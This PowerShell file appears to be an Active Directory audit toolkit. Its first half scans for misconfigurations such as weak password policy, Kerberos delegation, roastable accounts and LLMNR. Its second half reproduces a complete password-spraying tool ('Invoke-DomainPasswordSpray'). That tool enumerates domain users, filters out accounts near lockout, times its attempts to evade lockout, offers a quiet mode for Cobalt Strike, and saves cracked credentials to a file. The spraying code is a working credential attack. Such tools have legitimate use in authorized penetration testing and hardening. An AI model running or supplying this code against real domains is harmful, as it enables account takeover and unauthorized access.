function Show-Banner {
    <#
    .DESCRIPTION
        Shows the Banner for every search in the script.
    .PARAMETER Title
        Defines the title.
    .PARAMETER Description
        Defines the description.
    #>

    param(
        [string]$Title,
        [string]$Description
    )

    Write-Output "
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    +++ Title: $Title
    +++ Description: $Description
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    "
}

function SecurityGroups {
    $OSInfo = Get-WmiObject -Class Win32_OperatingSystem
    $languagepack = $OSInfo.MUILanguages
    # get group members of DNSAdmins
    Write-Host -ForegroundColor Yellow "[*]" -NoNewline
    Write-Host " Group Members of DNSAdmins:"
    if($languagepack -eq "de-DE") {
        Get-ADGroupMember 'DnsAdmins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } elseif ($languagepack -eq "en-EN") {
        Get-ADGroupMember 'DNSAdmins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } else {
        Write-Host -ForegroundColor Red "[x]" -NoNewline
        Write-Host " No supported langugage detected."   
    }
    Write-Output "----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
    # group members of Schema-Admins
    Write-Host -ForegroundColor Yellow "[*]" -NoNewline
    Write-Host " Group Members of Schema-Admins:"
    if($languagepack -eq "de-DE") {
        Get-ADGroupMember 'Schema-Admins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } elseif ($languagepack -eq "en-EN") {
        Get-ADGroupMember 'Schema Admins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } else {
        Write-Host -ForegroundColor Red "[x]" -NoNewline
        Write-Host " No supported langugage detected."   
    }
    Write-Output "----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
    # group members of Enterprise Admins
    Write-Host -ForegroundColor Yellow "[*]" -NoNewline
    Write-Host " Group Members of Enterprise-Admins/Organisations-Admins:"
    if($languagepack -eq "de-DE") {
        Get-ADGroupMember 'Organisations-Admins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } elseif ($languagepack -eq "en-EN") {
        Get-ADGroupMember 'Enterprise Admins' | Select-Object Name,SamAccountName,distinguishedName,SID | Format-Table
    } else {
        Write-Host -ForegroundColor Red "[x]" -NoNewline
        Write-Host " No supported langugage detected."   
    }
}

function Find-Misconfigurations {
    <#
    .DESCRIPTION
        Finding Active Directory misconfigurations with several queries.
    .PARAMETER Domain
        [required] Defines the domain.
    .PARAMETER Type
        [optional] Defines the scan type = light,extended. Default is "light".
    .EXAMPLE
        Find-Misconfigurations -Domain "test.local"
    #>

    param(
        [string]$Domain,

        [string]$Type = "light",
        [float]$version = 1.1
    )

    if($Type -eq "light") {
        Write-Host "============================= Light Scan =============================" -ForegroundColor Blue
        Write-Host "============================= Version = $version =============================" -ForegroundColor Blue
        Write-Host "============================= Type = light =============================" -ForegroundColor Blue
        
        Show-Banner -Title "Searching for disabled accounts" -Description "Disabled accounts can hold high privileges and can be activated again from attackers."
        $deactivatedAccounts = Get-ADUser -Filter {(Enabled -eq $False)} -Properties Name | Select-Object Name,SamAccountName,DistinguishedName,Enabled
        $deactivatedAccounts | Format-Table

        Show-Banner -Title "Searching for ms-DS-MachineAccountQuota" -Description "Checking if users can create machine accounts."
        $msDSMachineAccountQuota = Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
        $msDSMachineAccountQuota | Format-Table

        Show-Banner -Title "Searching for Domain Password Policy" -Description "Checking the strength of the domain password policy."
        $defaultDomainPolicy = Get-ADDefaultDomainPasswordPolicy -Identity "$Domain"
        try {
            if($defaultDomainPolicy.MinPasswordLength -ge "10")
            {
                Write-Host -ForegroundColor Green "[+]" -NoNewline
                Write-Host " Password policy is 10 or greater. Good job!"
                $defaultDomainPolicy
            } else {
                Write-Host -ForegroundColor Red "[!]" -NoNewline
                Write-Host " Seems that the domain password policy is weak."
                $defaultDomainPolicy
            }
        } catch {
            Write-Host -ForegroundColor Red "[-]" -NoNewline
            Write-Host " Something went wrong."
        }

        Show-Banner -Title "Searching for Users which can be delegated" -Description "Checking if users have Kerberos Delegation activated."
        $kerberosDelegation = Get-ADUser -Filter {AccountNotDelegated -eq $false} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated    # User Credentials können für Kerberos Delegation verwendet werden
        $kerberosDelegation | Format-Table

        Show-Banner -Title "Searching for Users which cannot be delegated" -Description "Checking if users have Kerberos Delegation activated."
        $kerberosDelegation = Get-ADUser -Filter {AccountNotDelegated -eq $true} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated     # User Credentials können nicht für Kerberos Delegation verwendet werden
        $kerberosDelegation | Format-Table

        Show-Banner -Title "Searching for Admin Accounts Kerberos Delegation" -Description "Checking if users have admincount greater than 0 and Kerberos Delegation activated."
        $admincountKerberosDelegation = Get-ADUser -Filter {(AdminCount -eq 1) -and (AccountNotDelegated -eq $false)} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated
        $admincountKerberosDelegation | Format-Table

        Show-Banner -Title "Searching KRBTGT password last set" -Description "Checking when the password of the krbtgt account was last set."
        $krbtgtPasswordLastSet = Get-ADUser "krbtgt" -Property Created, PasswordLastSet | Select-Object Created,PasswordLastSet
        $krbtgtPasswordLastSet | Format-Table

        Show-Banner -Title "Searching AD Administrator password last set" -Description "Checking when the password of the AD administrator account was last set."
        $adadminPasswordLastSet = Get-ADUser -Filter * -Properties * | Select-Object -Property SID,SamAccountName,Enabled,UserPrincipalName,PasswordLastSet | Where-Object -Property SID -like "*-500" | Out-Host
        $adadminPasswordLastSet | Format-Table

        Show-Banner -Title "Searching for accounts with PasswordNeverExpires" -Description "Never changing a bad password is bad for the whole Domain, especially Service Accounts."
        $pwNeverExpires = Get-ADUser -filter * -properties Name, PasswordNeverExpires | Where-Object { $_.passwordNeverExpires -eq "true" } |  Select-Object DistinguishedName,Name,Enabled,PasswordNeverExpires | Format-Table
        $pwNeverExpires | Format-Table
    } elseif($Type -eq "extended") {
        Write-Host "============================= Extended Scan =============================" -ForegroundColor Blue
        Write-Host "============================= Version = $version =============================" -ForegroundColor Blue
        Write-Host "============================= Type = extended =============================" -ForegroundColor Blue
        
        Show-Banner -Title "Searching for disabled accounts" -Description "Disabled accounts can hold high privileges and can be activated again from attackers."
        $deactivatedAccounts = Get-ADUser -Filter {(Enabled -eq $False)} -Properties Name | Select-Object Name,SamAccountName,DistinguishedName,Enabled
        $deactivatedAccounts | Format-Table

        Show-Banner -Title "Searching for ms-DS-MachineAccountQuota" -Description "Checking if users can create machine accounts."
        $msDSMachineAccountQuota = Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
        $msDSMachineAccountQuota | Format-Table

        Show-Banner -Title "Searching for Domain Password Policy" -Description "Checking the strength of the domain password policy."
        $defaultDomainPolicy = Get-ADDefaultDomainPasswordPolicy -Identity "$Domain"
        try {
            if($defaultDomainPolicy.MinPasswordLength -ge "10")
            {
                Write-Host -ForegroundColor Green "[+]" -NoNewline
                Write-Host " Password policy is 10 or greater. Good job!"
                $defaultDomainPolicy
            } else {
                Write-Host -ForegroundColor Red "[!]" -NoNewline
                Write-Host " Seems that the domain password policy is weak."
                $defaultDomainPolicy
            }
        } catch {
            Write-Host -ForegroundColor Red "[-]" -NoNewline
            Write-Host " Something went wrong."
        }

        Show-Banner -Title "Searching for Users which can be delegated" -Description "Checking if users have Kerberos Delegation activated."
        $kerberosDelegation = Get-ADUser -Filter {AccountNotDelegated -eq $false} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated    # User Credentials können für Kerberos Delegation verwendet werden
        $kerberosDelegation | Format-Table

        Show-Banner -Title "Searching for Users which cannot be delegated" -Description "Checking if users have Kerberos Delegation activated."
        $kerberosDelegation = Get-ADUser -Filter {AccountNotDelegated -eq $true} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated     # User Credentials können nicht für Kerberos Delegation verwendet werden
        $kerberosDelegation | Format-Table

        Show-Banner -Title "Searching for Admin Accounts Kerberos Delegation" -Description "Checking if users have admincount greater than 0 and Kerberos Delegation activated."
        $admincountKerberosDelegation = Get-ADUser -Filter {(AdminCount -eq 1) -and (AccountNotDelegated -eq $false)} | Format-Table sAMAccountName,DistinguishedName,AccountNotDelegated
        $admincountKerberosDelegation | Format-Table

        Show-Banner -Title "Searching KRBTGT password last set" -Description "Checking when the password of the krbtgt account was last set."
        $krbtgtPasswordLastSet = Get-ADUser "krbtgt" -Property Created, PasswordLastSet | Select-Object Created,PasswordLastSet
        $krbtgtPasswordLastSet | Format-Table

        Show-Banner -Title "Searching AD Administrator password last set" -Description "Checking when the password of the AD administrator account was last set."
        $adadminPasswordLastSet = Get-ADUser -Filter * -Properties * | Select-Object -Property SID,SamAccountName,Enabled,UserPrincipalName,PasswordLastSet | Where-Object -Property SID -like "*-500" | Out-Host
        $adadminPasswordLastSet | Format-Table

        Show-Banner -Title "Searching for accounts with PasswordNeverExpires" -Description "Never changing a bad password is bad for the whole Domain, especially Service Accounts."
        $pwNeverExpires = Get-ADUser -filter * -properties Name, PasswordNeverExpires | Where-Object { $_.passwordNeverExpires -eq "true" } |  Select-Object DistinguishedName,Name,Enabled,PasswordNeverExpires | Format-Table
        $pwNeverExpires | Format-Table

        Show-Banner -Title "LLMNR Check" -Description "Checks if LLMNR is activated, leads to credential passing to the attacker if DNS fails."
        $checkLLMNR = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -name EnableMulticast -ErrorAction SilentlyContinue
        if($checkLLMNR.EnableMulticast -eq "0")
        {
            Write-Host "[+] LLMNR is deactivated." -ForegroundColor Green
        } else {
            Write-Host "[!] LLMNR is enabled. Should be deactivated." -ForegroundColor Red
        }

        Show-Banner -Title "Security Group Membership" -Description "Checks if the typical security groups has members in."
        SecurityGroups | Format-Table
    } elseif($Type -eq "quickwins") {
        Show-Banner -Title "AS-REP Roasting" -Description "Searching for accounts which do not require kerberos pre authentication."
        $asREPRoasting = Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object DoesNotRequirePreAuth -eq $true | Select-Object Name,SamAccountName,Enabled,DoesNotRequirePreAuth
        if($asREPRoasting -ne $null) {
            $asREPRoasting | Format-Table
        }

        Show-Banner -Title "Kerberostable Accounts" -Description "Searching for accounts which are possibly affected for Kerberoasting"
        $kerberoastableAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
        if($kerberoastableAccounts -ne $null) {
            $kerberoastableAccounts | Format-Table
        }

        Show-Banner -Title "LLMNR Check" -Description "Checks if LLMNR is activated, leads to credential passing to the attacker if DNS fails."
        $checkLLMNR = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -name EnableMulticast -ErrorAction SilentlyContinue
        if($checkLLMNR.EnableMulticast -eq "0")
        {
            Write-Host "[+] LLMNR is deactivated." -ForegroundColor Green
        } else {
            Write-Host "[!] LLMNR is enabled. Should be deactivated." -ForegroundColor Red
        }
    }
}

function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force

    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .PARAMETER Quiet

    Less output so it will work better with things like Cobalt Strike

    .PARAMETER UsernameAsPassword

    For each user, will try that user's name as their password

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UserList = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $Password,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $PasswordList,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $Filter = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $Force,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $UsernameAsPassword,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $Delay=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $Jitter=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $Quiet,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $Fudge=10
    )

    if ($Password)
    {
        $Passwords = @($Password)
    }
    elseif($UsernameAsPassword)
    {
        $Passwords = ""
    }
    elseif($PasswordList)
    {
        $Passwords = Get-Content $PasswordList
    }
    else
    {
        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
        break
    }

    try
    {
        if ($Domain -ne "")
        {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    if ($UserList -eq "")
    {
        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-Host "[*] Using $UserList as userlist to spray with"
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $UserListArray = @()
        try
        {
            $UserListArray = Get-Content $UserList -ErrorAction stop
        }
        catch [Exception]
        {
            Write-Host -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($Passwords.count -gt 1)
    {
        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $observation_window = Get-ObservationWindow $CurrentDomain

    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
    Write-Host "[*] Setting a $observation_window minute wait in between sprays."

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!$Force)
    {
        $title = "Confirm Password Spray"
        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0)

        if ($result -ne 0)
        {
            Write-Host "Cancelling the password spray."
            break
        }
    }
    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $Passwords.count " passwords"
    Write-Host "[*] This might take a while depending on the total number of users"

    if($UsernameAsPassword)
    {
        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword -Quiet $Quiet
    }
    else
    {
        for($i = 0; $i -lt $Passwords.count; $i++)
        {
            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
            if (($i+1) -lt $Passwords.count)
            {
                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet
            }
        }
    }

    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($OutFile -ne "")
    {
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
    }
}

function Countdown-Timer
{
    param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout.",
        [switch] $Quiet = $False
    )
    if ($quiet)
    {
        Write-Host "${Message}: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
        Start-Sleep -Seconds $Seconds
    } else {
        foreach ($Count in (1..$Seconds))
        {
            Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
            Start-Sleep -Seconds 1
        }
        Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This module gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))

    .PARAMETER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .EXAMPLE

    PS C:\> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".

    .EXAMPLE

    C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $Filter
    )

    try
    {
        if ($Domain -ne "")
        {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    # Setting the current domain's account lockout threshold
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                $AccountLockoutThresholds += $PSOLockoutThreshold

                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }
    }

    $observation_window = Get-ObservationWindow $CurrentDomain

    # Generate a userlist from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($SmallestLockoutThreshold -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
    }

    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $UserSearcher.SearchRoot = $DirEntry

    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($RemoveDisabled)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
        # LDAP 1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 is LOCKOUT
        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
        $UserSearcher.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
    }
    else
    {
        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
    }

    $UserSearcher.PropertiesToLoad.add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.add("lockouttime") > $Null
    $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null

    #Write-Host $UserSearcher.filter

    # grab batches of 1000 in results
    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
    $UserListArray = @()

    if ($RemovePotentialLockouts)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($user in $AllUserObjects)
        {
            # Getting bad password counts and lst bad password time for each user
            $badcount = $user.Properties.badpwdcount
            $samaccountname = $user.Properties.samaccountname
            try
            {
                $badpasswordtime = $user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $currenttime = Get-Date
            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

            if ($badcount)
            {
                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
                                {
                    $UserListArray += $samaccountname
                }
            }
        }
    }
    else
    {
        foreach ($user in $AllUserObjects)
        {
            $samaccountname = $user.Properties.samaccountname
            $UserListArray += $samaccountname
        }
    }

    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
    return $UserListArray
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $Domain,
            [Parameter(Position=2)]
            [string[]]
            $UserListArray,
            [Parameter(Position=3)]
            [string]
            $Password,
            [Parameter(Position=4)]
            [string]
            $OutFile,
            [Parameter(Position=5)]
            [int]
            $Delay=0,
            [Parameter(Position=6)]
            [double]
            $Jitter=0,
            [Parameter(Position=7)]
            [switch]
            $UsernameAsPassword,
            [Parameter(Position=7)]
            [switch]
            $Quiet
    )
    $time = Get-Date
    $count = $UserListArray.count
    Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
    $curr_user = 0
    if ($OutFile -ne ""-and -not $Quiet)
    {
        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
    }
    $RandNo = New-Object System.Random

    foreach ($User in $UserListArray)
    {
        if ($UsernameAsPassword)
        {
            $Password = $User
        }
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
        if ($Domain_check.name -ne $null)
        {
            if ($OutFile -ne "")
            {
                Add-Content $OutFile $User`:$Password
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
        }
        $curr_user += 1
        if (-not $Quiet)
        {
            Write-Host -nonewline "$curr_user of $count users tested`r"
        }
        if ($Delay)
        {
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
        }
    }

}

function Get-ObservationWindow($DomainEntry)
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
    return $observation_window
}
